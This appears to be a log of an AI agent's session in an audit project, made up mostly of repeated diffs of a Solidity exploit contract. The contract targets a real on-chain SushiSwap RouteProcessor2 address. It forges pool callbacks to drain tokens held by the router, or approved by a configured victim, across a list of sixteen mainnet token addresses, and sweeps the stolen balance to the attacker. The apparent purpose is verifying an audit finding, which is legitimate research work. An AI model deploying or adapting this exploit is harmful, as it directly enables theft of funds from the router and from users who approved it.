+    98	            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
+    99	        }
+   100	    }
+   101	
+   102	    function _sweepToBeneficiary() internal {
+   103	        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+   104	        if (stolen > 0) {
+   105	            _safeTransfer(forgedToken, beneficiary, stolen);
+   106	        }
+   107	    }
+   108	
+   109	    function _safeTransfer(address token, address to, uint256 amount) internal {
+   110	        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+   111	        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+   112	    }
+   113	
+   114	    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
+   115	        require(amountSpecified > 0, "non-positive amount");
+   116	        return uint256(amountSpecified);
+   117	    }
+   118	}
+   119	
+   120	contract FlawVerifier {
+   121	    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+   122	
+   123	    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
+   124	    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
+   125	    uint8 internal constant POOL_UNIV3 = 1;
+   126	    uint8 internal constant POOL_TRIDENT_CL = 5;
+   127	
+   128	    address internal immutable POOL;
+   129	
+   130	    address internal storedProfitToken;
+   131	    uint256 internal storedProfitAmount;
+   132	
+   133	    address public configuredVictim;
+   134	    address public configuredVictimToken;
+   135	
+   136	    constructor() {
+   137	        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+   138	    }
+   139	
+   140	    function executeOnOpportunity() external {
+   141	        if (storedProfitAmount != 0) {
+   142	            return;
+   143	        }
+   144	
+   145	        if (_drainRouterBalances(false)) {
+   146	            return;
+   147	        }
+   148	
+   149	        if (_drainRouterBalances(true)) {
+   150	            return;
+   151	        }
+   152	
+   153	        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+   154	            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
+   155	                return;
+   156	            }
+   157	
+   158	            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+   159	        }
+   160	    }
+   161	
+   162	    function configureVictim(address victim, address token) external {
+   163	        configuredVictim = victim;
+   164	        configuredVictimToken = token;
+   165	    }
+   166	
+   167	    function profitToken() external view returns (address) {
+   168	        return storedProfitToken;
+   169	    }
+   170	
+   171	    function profitAmount() external view returns (uint256) {
+   172	        return storedProfitAmount;
+   173	    }
+   174	
+   175	    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+   176	        address[16] memory candidates = [
+   177	            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
+   178	            0xdAC17F958D2ee523a2206206994597C13D831ec7,
+   179	            0x6B175474E89094C44Da98b954EedeAC495271d0F,
+   180	            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
+   181	            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
+   182	            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
+   183	            0x514910771AF9Ca656af840dff83E8264EcF986CA,
+   184	            0xD533a949740bb3306d119CC777fa900bA034cd52,
+   185	            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
+   186	            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
+   187	            0x853d955aCEf822Db058eb8505911ED77F175b99e,
+   188	            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
+   189	            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
+   190	            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
+   191	            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
+   192	            0x111111111117dC0aa78b770fA6A738034120C302
+   193	        ];
+   194	
+   195	        for (uint256 i = 0; i < candidates.length; ++i) {
+   196	            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+   197	            if (routerBalance <= 1) {
+   198	                continue;
+   199	            }
+   200	
+   201	            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+   202	                return true;
+   203	            }
+   204	        }
+   205	
+   206	        return false;
+   207	    }
+   208	
+   209	    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+   210	        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+   211	        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+   212	
+   213	        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+   214	        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+   215	            return _recordProfitIfAny(token, beforeBalance);
+   216	        } catch {
+   217	            return false;
+   218	        }
+   219	    }
+   220	
+   221	    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+   222	        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+   223	        uint256 balance = IERC20(token).balanceOf(victim);
+   224	        uint256 amountToPull = allowance < balance ? allowance : balance;
+   225	        if (amountToPull == 0) {
+   226	            return false;
+   227	        }
+   228	
+   229	        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+   230	        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+   231	
+   232	        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+   233	        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+   234	            return _recordProfitIfAny(token, beforeBalance);
+   235	        } catch {
+   236	            return false;
+   237	        }
+   238	    }
+   239	
+   240	    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
+   241	        uint256 afterBalance = IERC20(token).balanceOf(address(this));
+   242	        if (afterBalance > beforeBalance) {
+   243	            storedProfitToken = token;
+   244	            storedProfitAmount = afterBalance - beforeBalance;
+   245	            return true;
+   246	        }
+   247	
+   248	        return false;
+   249	    }
+   250	
+   251	    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+   252	        return abi.encodePacked(
+   253	            uint8(COMMAND_PROCESS_MY_ERC20),
+   254	            token,
+   255	            uint8(1),
+   256	            uint16(65535),
+   257	            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
+   258	            POOL,
+   259	            uint8(1),
+   260	            address(this)
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+exec
+/bin/bash -lc "nl -ba src/FlawVerifier.sol | sed -n '260,340p'" in /Users/zhanglongqin/AuditHoundV2/cases/sushi_router/src/onchain_auto
+ succeeded in 0ms:
+   260	            address(this)
+   261	        );
+   262	    }
+   263	
+   264	    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+   265	        return abi.encodePacked(
+   266	            uint8(COMMAND_PROCESS_USER_ERC20),
+   267	            token,
+   268	            uint8(1),
+   269	            uint16(65535),
+   270	            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
+   271	            POOL,
+   272	            uint8(1),
+   273	            address(this)
+   274	        );
+   275	    }
+   276	}
+
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
